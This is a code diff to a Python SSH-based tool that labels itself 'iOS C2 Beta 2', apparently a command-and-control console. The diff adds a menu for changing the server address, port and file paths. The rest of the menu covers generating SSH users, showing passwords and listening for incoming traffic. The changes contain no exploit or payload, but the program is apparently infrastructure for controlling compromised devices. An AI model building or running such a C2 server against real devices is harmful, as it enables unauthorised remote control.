@@ -11,6 +11,7 @@ from socketserver import ThreadingTCPServer, BaseRequestHandler
 import paramiko
 
 
+
 class CustomSSHServerInterface(ServerInterface):
 
     def check_auth_password(self, username, password):
@@ -80,6 +81,58 @@ def write_user_table(user_table):
 def generate_random_string(length, charset):
     return "".join(random.choice(charset) for _ in range(length))
 
+def manage_server_address():
+    script_directory = os.path.dirname(os.path.realpath(__file__))
+    config_file = Path(f"{script_directory}/config.txt")
+    userdata_directory = Path(f"{script_directory}/userdata")
+
+    if config_file.exists():
+        with open(config_file, "r") as f:
+            server_address = f.readline().strip().split(":", 1)
+    else:
+        server_address = ("192.168.50.120", 22)
+        with open(config_file, "w") as f:
+            f.write(f"{server_address[0]}:{server_address[1]}\n")
+
+    while True:
+        clear_screen()
+        try:
+            print(f"Script directory: {script_directory}")
+            print(f"Config file location: {config_file}")
+            print(f"User data directory: {userdata_directory}")
+            print(f"\nCurrent server address: {server_address[0]}:{server_address[1]}")
+            print("\n1. Change host address")
+            print("2. Change port")
+            print("3. Change config file location")
+            print("4. Change user data directory")
+            print("0. Exit")
+
+            choice = input("\nEnter your choice: ")
+
+            if choice == "1":
+                new_host = input("\nEnter the new host address: ")
+                server_address = (new_host, server_address[1])
+            elif choice == "2":
+                new_port = int(input("\nEnter the new port: "))
+                server_address = (server_address[0], new_port)
+            elif choice == "3":
+                new_config_path = input("\nEnter the new config file location: ")
+                config_file = Path(new_config_path)
+            elif choice == "4":
+                new_userdata_path = input("\nEnter the new user data directory: ")
+                userdata_directory = Path(new_userdata_path)
+            elif choice == "0":
+                break
+            else:
+                print("Invalid choice. Please try again.")
+
+            with open(config_file, "w") as f:
+                f.write(f"{server_address[0]}:{server_address[1]}\n")
+        except IndexError:
+            print("Error reading server address from the config file. Please check the file format.")
+            break
+
+    return tuple(server_address)
 
 def create_ssh_user():
     charset = string.ascii_letters + string.digits
@@ -92,6 +145,7 @@ def create_ssh_user():
 
 
 def list_users():
+    clear_screen()
     user_table = read_user_table()
     return list(user_table.items())
 
@@ -106,8 +160,8 @@ def clear_screen():
 def main():
     global host_key
     host_key = RSAKey.generate(bits=2048)
+    server_address = ("localhost", 22)  #DEFAULT
 
-    server_address = ("192.168.50.120", 22)
     ssh_server = ThreadingTCPServer(server_address, SSHRequestHandler)
     ssh_server_thread = threading.Thread(target=ssh_server.serve_forever)
     ssh_server_thread.daemon = True
@@ -143,10 +197,11 @@ def main():
              """)
         print("iOS C2 Beta 2")
         print("       ")
-        print("1. SSH user generation")
-        print("2. Display users and passwords")
-        print("3. User management")
-        print("4. Listen for incoming traffic")
+        print("1. SSH User Generation")
+        print("2. Display Users And Passwords")
+        print("3. User Management")
+        print("4. Listen For Incoming Traffic")
+        print("5. SSH Server Managment")
         print("0. Exit")
 
         choice = input("Enter your choice: ")
@@ -192,9 +247,11 @@ def main():
                 command = input()
                 if command.lower() == "back":
                     break
-
+        elif choice == "5":
+            server_address = manage_server_address()
+            ssh_server.server_address = server_address
         elif choice == "0":
             break
-        
+
 if __name__ == "__main__":
     main()
